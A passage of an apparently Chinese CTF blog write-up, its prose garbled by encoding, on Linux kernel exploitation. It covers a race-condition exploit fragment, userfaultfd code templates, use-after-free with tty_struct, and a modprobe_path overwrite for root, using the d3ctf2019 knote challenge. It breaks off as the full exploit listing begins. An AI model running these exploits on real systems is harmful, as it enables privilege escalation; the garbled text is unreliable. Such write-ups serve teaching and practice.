<span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line">    pthread_create(&amp;tid,<span class="literal">NULL</span>,change_flag_addr,flag_addr);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100000</span>;i++)&#123;</span><br><span class="line">        m.buf=buf;</span><br><span class="line">        ret=ioctl(fd,<span class="number">0x1337</span>,&amp;m);</span><br><span class="line">        <span class="keyword">if</span>(ret==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;susses\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    system(<span class="string">&quot;dmesg |grep &#x27;Looks like the flag is&#x27; &gt; ./flag.txt&quot;</span>);</span><br><span class="line">    temp_fd=open(<span class="string">&quot;./flag.txt&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    read(temp_fd,buf,<span class="number">100</span>);</span><br><span class="line">    write(STDOUT_FILENO,buf,<span class="number">100</span>);</span><br><span class="line">    close(temp_fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="userfaultfd"><a href="#userfaultfd" class="headerlink" title="userfaultfd"></a>userfaultfd</h3><p>userfaultfdæ˜¯linuxç³»ç»Ÿåœ¨ç”¨æˆ·æ€çš„ä¸€ä¸ªç¼ºé¡µå¤„ç†æœºåˆ¶ï¼Œç”¨æˆ·å¯ä»¥è‡ªå®šä¹‰å‡½æ•°æ¥å¤„ç†æ­¤ç±»äº‹ä»¶ï¼Œå°±åƒkvmä¸€æ ·ï¼Œlinuxç³»ç»Ÿå·²ç»è§„å®šå¥½äº†userfaultfdçš„æ¥å£ï¼Œç”¨æˆ·å¯ä»¥åˆ©ç”¨è§„å®šçš„æ¥å£å¯¹æŸä¸€è™šæ‹Ÿå†…å­˜è¿›è¡Œç›‘è§†ï¼Œå¹¶ä¸”å¯ä»¥æ³¨å†Œä¸€ä¸ªå‡½æ•°ï¼Œå½“ç›‘è§†å†…å­˜å‘ç”Ÿç¼ºé¡µå¼‚å¸¸çš„æ—¶å€™å°±ä¼šå»æ‰§è¡Œè¿™ä¸ªæ³¨å†Œå‡½æ•°ã€‚</p>
<p>ä½¿ç”¨userfaultfdçš„ä»£ç åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œä¸€éƒ¨åˆ†æ˜¯ç›‘æ§å¹¶æ³¨å†Œå‡½æ•°ï¼Œä¸€éƒ¨åˆ†æ˜¯è‡ªå®šä¹‰å¤„ç†å‡½æ•°çš„å®šä¹‰</p>
<p><strong>æ³¨å†Œæ¨¡æ¿</strong></p>
<p>å…¶ä¸­<code>register_userfault</code>å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯å—ç›‘æ§å†…å­˜ï¼Œç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯è‡ªå®šä¹‰å¤„ç†å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span>* err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(err_msg);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pthread_t</span> thr;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">	ua.api = UFFD_API;</span><br><span class="line">	ua.features    = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">		err_exit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">	ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page; <span class="comment">//æˆ‘ä»¬è¦ç›‘è§†çš„åŒºåŸŸ</span></span><br><span class="line">	ur.range.len   = PAGE_SIZE;</span><br><span class="line">	ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">	<span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>) <span class="comment">//æ³¨å†Œç¼ºé¡µé”™è¯¯å¤„ç†</span></span><br><span class="line">        <span class="comment">//å½“å‘ç”Ÿç¼ºé¡µæ—¶ï¼Œç¨‹åºä¼šé˜»å¡ï¼Œæ­¤æ—¶ï¼Œæˆ‘ä»¬åœ¨å¦ä¸€ä¸ªçº¿ç¨‹é‡Œæ“ä½œ</span></span><br><span class="line">		err_exit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">	<span class="comment">//å¼€ä¸€ä¸ªçº¿ç¨‹ï¼Œæ¥æ”¶é”™è¯¯çš„ä¿¡å·ï¼Œç„¶åå¤„ç†</span></span><br><span class="line">	<span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">	<span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">		err_exit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>è‡ªå®šä¹‰å¤„ç†å‡½æ•°æ¨¡æ¿</strong></p>
<p>å¯ä»¥æŠŠè‡ªå®šä¹‰å¤„ç†å‡½æ•°åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œå‰åŠéƒ¨åˆ†å°±æ˜¯æ¨¡æ¿æ“ä½œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è½®è¯¢uffdè¯»åˆ°çš„ä¿¡æ¯éœ€è¦å­˜åœ¨ä¸€ä¸ªstruct uffd_msgå¯¹è±¡ä¸­</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line"><span class="comment">// ioctlçš„UFFDIO_COPYé€‰é¡¹éœ€è¦æˆ‘ä»¬æ„é€ ä¸€ä¸ªstruct uffdio_copyå¯¹è±¡</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">uffd = (<span class="keyword">long</span>) arg;</span><br></pre></td></tr></table></figure>

<p>ååŠéƒ¨åˆ†æ˜¯çœŸæ­£çš„å¤„ç†ä»£ç </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123; <span class="comment">// æ­¤çº¿ç¨‹ä¸æ–­è¿›è¡Œpollingï¼Œæ‰€ä»¥æ˜¯æ­»å¾ªç¯</span></span><br><span class="line">        <span class="comment">// polléœ€è¦æˆ‘ä»¬æ„é€ ä¸€ä¸ªstruct pollfdå¯¹è±¡</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="comment">// è¯»å‡ºuser-faultç›¸å…³ä¿¡æ¯</span></span><br><span class="line">        read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="comment">// å¯¹äºæˆ‘ä»¬æ‰€æ³¨å†Œçš„ä¸€èˆ¬user-faultåŠŸèƒ½ï¼Œéƒ½åº”æ˜¯UFFD_EVENT_PAGEFAULTè¿™ä¸ªäº‹ä»¶</span></span><br><span class="line">        assert(msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line">        <span class="comment">// æ„é€ uffdio_copyè¿›è€Œè°ƒç”¨ioctl-UFFDIO_COPYå¤„ç†è¿™ä¸ªuser-fault</span></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// page(æˆ‘ä»¬å·²æœ‰çš„ä¸€ä¸ªé¡µå¤§å°çš„æ•°æ®)ä¸­page_sizeå¤§å°çš„å†…å®¹å°†è¢«æ‹·è´åˆ°æ–°åˆ†é…çš„msg.arg.pagefault.addresså†…å­˜é¡µä¸­</span></span><br><span class="line">        ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy);</span><br><span class="line">          ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ç†æ¸…æ¥šäº†userfaultfdï¼Œé‚£å¯¹äºæ¡ä»¶ç«äº‰åˆæœ‰ä»€ä¹ˆç”¨å¤„å‘¢ï¼Œå¯ä»¥å…ˆçœ‹ä¸‹é¢è¿™æ®µä»£ç ,å¦‚æœè¿™æ®µä»£ç æ²¡æœ‰åŠ é”ï¼Œé‚£ä¹ˆå½“<code>copy_from_user</code>å‡½æ•°è¦å‘pträ½†è¿˜æ²¡å†™å…¥æ—¶ï¼Œæ­¤æ—¶å¦ä¸€ä¸ªçº¿ç¨‹æŠŠptrç»™freeæ‰ç„¶åå†æŠŠè¿™ä¸ªå †å—ç”³è¯·å›æ¥ï¼Œè¿™ä¸ªå †å—æ˜¯æ¯”è¾ƒç‰¹æ®Šçš„å †å—ï¼Œæ¯”å¦‚<code>tty_struct</code>,è¿™æ ·æˆ‘ä»¬å°±æ§åˆ¶äº†tty_struct,è¿›è€Œå¯ä»¥æ§åˆ¶ç¨‹åºæµäº†ï¼Œä½†æ˜¯è¿™æ ·æ¦‚ç‡ä¼šå¾ˆå°ï¼Œå¦‚æœè®¿é—®user_bufå‘ç”Ÿäº†ç¼ºé¡µå¼‚å¸¸ï¼Œé‚£å°±ä¼šåœä¸‹æ¥å»æ‰§è¡Œç¼ºé¡µå¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œå¤„ç†å®Œå†ç»§ç»­æ‰§è¡Œ<code>copy_from_user</code>å‡½æ•°ï¼Œå¦‚æœæˆ‘ä»¬åœ¨ç¼ºé¡µå¼‚å¸¸å¤„ç†å‡½æ•°ä¸­å†<code>sleep</code>ä¸€ä¸‹ï¼Œé‚£ç©ºæ¡£æœŸå°±éå¸¸é•¿äº†ï¼Œåœ¨è¿™æ®µæ—¶é—´é‡Œé‡Šæ”¾åœ¨ç”³è¯·ï¼Œæœ€åæˆåŠŸå†™çš„æ¦‚ç‡å°±å¾ˆå¤§äº†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ptr) &#123;  </span><br><span class="line">   ...  </span><br><span class="line">   copy_from_user(ptr,user_buf,len);  </span><br><span class="line">   ...  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>è¯´ç™½äº†ä½¿ç”¨userfaultfdå°±æ˜¯ä¸ºäº†æé«˜æ¡ä»¶ç«äº‰æˆåŠŸçš„æ¦‚ç‡ã€‚</p>
<p><strong>ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯5.11ç‰ˆæœ¬ä»¥åï¼Œéç‰¹æƒç”¨æˆ·å°±è¢«ç¦æ­¢ä½¿ç”¨userfaultfdäº†</strong></p>
<h4 id="ä¾‹é¢˜-d3ctf2019-knote"><a href="#ä¾‹é¢˜-d3ctf2019-knote" class="headerlink" title="ä¾‹é¢˜ d3ctf2019-knote"></a>ä¾‹é¢˜ d3ctf2019-knote</h4><p><strong>å¯åŠ¨è„šæœ¬</strong></p>
<p>è™šæ‹Ÿäº†ä¸¤ä¸ªcpu,æ¯ä¸ªcpuä¸€ä¸ªæ ¸ï¼Œæ‰€ä»¥å¯ä»¥æ”¯æŒä¸¤ä¸ªçº¿ç¨‹ã€‚ä¿æŠ¤é™¤äº†kptiæ²¡å¼€ä»¥å¤–å…¶ä»–çš„éƒ½å¼€äº†ã€‚</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./rootfs.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-smp cores=2,threads=1 \</span><br><span class="line">-cpu qemu64,+smep,+smap</span><br></pre></td></tr></table></figure>

<p><strong>æ–‡ä»¶ç³»ç»Ÿå¯åŠ¨è„šæœ¬</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&#123;==DBG==&#125; INIT SCRIPT&quot;</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line">mdev -s</span><br><span class="line"><span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;&#123;==DBG==&#125; Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">insmod note.ko</span><br><span class="line">mknod /dev/knote c 10 233</span><br><span class="line">chmod 666 /dev/knote</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">chown 0:0 /flag</span><br><span class="line">chmod 400 /flag</span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">chroot . setuidgid 1000 /bin/sh <span class="comment">#normal user</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜å°±æ˜¯åœ¨å†…æ ¸å®ç°äº†ä¸€ä¸ªèœå•å †ï¼Œæœ‰add,get,del,editå››ä¸ªåŠŸèƒ½ï¼Œå…¶ä¸­delå’Œaddæ˜¯åŠ äº†è¯»å†™é”çš„ï¼Œæ²¡æ³•æ¡ä»¶ç«äº‰ï¼Œä½†æ˜¯getå’Œeditæ˜¯å¯ä»¥çš„ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡getè¿›è¡Œæ¡ä»¶ç«äº‰æ¥å®Œæˆå†…æ ¸åœ°å€æ³„éœ²ï¼Œåœ¨è¿™ä¸ªå†…æ ¸ç‰ˆæœ¬ä¸­tty_structå¤§å°æ˜¯0x2e0,æ‰€ä»¥å¯ä»¥å…ˆç”³è¯·ä¸€ä¸ª0x2e0çš„å †ï¼Œç„¶ååœ¨getçš„æ—¶å€™æ¡ä»¶ç«äº‰ï¼Œåœ¨ç¼ºé¡µå¤„ç†çš„æ—¶å€™å…ˆæŠŠè¿™ä¸ªå †å—freeæ‰ï¼Œç„¶åå†æ‰“å¼€ä¸€ä¸ª<code>ptmx</code>ï¼Œå°±ä¼šåœ¨å†…æ ¸ç”³è¯·ä¸€ä¸ª0x2e0çš„å †ï¼Œæœ‰æ¦‚ç‡ç”³è¯·åˆ°åˆšfreeçš„å †å—ï¼Œç¼ºé¡µå¤„ç†å®Œå†è¿›è¡Œæ‹·è´çš„è¯å°±èƒ½å¾—åˆ°<code>tty_struct</code>çš„å†…å®¹äº†ï¼Œå°±èƒ½å¾—åˆ°å†…æ ¸åœ°å€äº†ï¼Œç„¶ååœ¨editçš„æ—¶å€™å†æ¬¡è¿›è¡Œæ¡ä»¶ç«äº‰å°±å¯ä»¥ä»»æ„åœ°å€å†™äº†ï¼Œä½†æ˜¯æ€ä¹ˆåˆ©ç”¨è¿™ä¸ªä»»æ„åœ°å€æå‡æƒé™å‘¢</p>
<p><strong>modprobe_path</strong></p>
<p>å½“åœ¨ç”¨æˆ·æ€ä½¿ç”¨<code>execve</code>æ‰§è¡Œä¸€ä¸ªéæ³•çš„æ–‡ä»¶çš„æ—¶å€™ï¼Œå†…æ ¸ä¼šæœ‰å¦‚ä¸‹è°ƒç”¨é“¾</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL_64()</span><br><span class="line">    sys_execve()</span><br><span class="line">        do_execve()</span><br><span class="line">            do_execveat_common()</span><br><span class="line">                bprm_execve()</span><br><span class="line">                    exec_binprm()</span><br><span class="line">                        search_binary_handler()</span><br><span class="line">                            __request_module() </span><br><span class="line">                                call_modprobe()</span><br></pre></td></tr></table></figure>

<p>æœ€åä¸€ä¸ªå‡½æ•°å®šä¹‰äº<code>/kernel/kmod.c</code>,ä¸‹é¢å°±æ˜¯é¢˜ç›®å†…æ ¸ç‰ˆæœ¬å¯¹åº”çš„<code>call_modprobe()</code>æºç ï¼Œåœ¨å‡½æ•°çš„æœ€åä¼šè°ƒç”¨<code>call_usermodehelper_exec()</code>å‡½æ•°ï¼Œå°†<code>modprobe_path</code>ä½œä¸ºå¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ï¼Œä»¥rootæƒé™å°†å…¶æ‰§è¡Œï¼Œ<code>modprobe_path</code>é»˜è®¤å­˜å‚¨ç€æ‰§è¡Œè·¯å¾„<code>/sbin/modprobe</code>.</p>
<p>æ‰€ä»¥å¯ä»¥é€šè¿‡ä»»æ„åœ°å€å†™æ¥è§¦<code>modprobe_path</code>,å°†å…¶æ”¹å†™ä¸ºæˆ‘ä»¬æ„é€ çš„æ¶æ„è„šæœ¬çš„è·¯å¾„ï¼Œç„¶åæ‰§è¡Œä¸€ä¸ªéæ³•æ–‡ä»¶è§¦å‘ä¸Šè¿°è°ƒç”¨é“¾ï¼Œæœ€åä»¥rootç”¨æˆ·æ‰§è¡Œæ¶æ„è„šæœ¬ï¼Œæ€è·¯å°±æ˜¯è¿™æ ·</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">call_modprobe</span><span class="params">(<span class="keyword">char</span> *module_name, <span class="keyword">int</span> wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123;</span><br><span class="line">		<span class="string">&quot;HOME=/&quot;</span>,</span><br><span class="line">		<span class="string">&quot;TERM=linux&quot;</span>,</span><br><span class="line">		<span class="string">&quot;PATH=/sbin:/usr/sbin:/bin:/usr/bin&quot;</span>,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> **argv = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">char</span> *[<span class="number">5</span>]), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!argv)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	module_name = kstrdup(module_name, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!module_name)</span><br><span class="line">		<span class="keyword">goto</span> free_argv;</span><br><span class="line"></span><br><span class="line">	argv[<span class="number">0</span>] = modprobe_path;</span><br><span class="line">	argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">	argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">	argv[<span class="number">3</span>] = module_name;	<span class="comment">/* check free_modprobe_argv() */</span></span><br><span class="line">	argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line">					 <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!info)</span><br><span class="line">		<span class="keyword">goto</span> free_module_name;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);</span><br><span class="line">free_module_name:</span><br><span class="line">	kfree(module_name);</span><br><span class="line">free_argv:</span><br><span class="line">	kfree(argv);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a><strong>exp</strong></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span 